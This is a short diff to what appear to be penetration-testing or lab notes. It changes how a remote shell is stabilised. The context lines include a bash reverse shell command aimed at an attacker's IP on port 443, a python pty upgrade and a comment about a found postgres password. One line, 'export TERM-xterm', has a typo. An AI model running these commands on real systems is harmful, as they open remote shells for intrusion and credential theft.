@@ -33,8 +33,7 @@ bash -c "bash -i >& /dev/tcp/[attacker's ip]/443 0>&1"
 # Stabilize bash.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 # CRTL + Z
-stty raw -echo
-fg
+stty raw -echo;fg
 export TERM-xterm
 
 # We found postgres password:
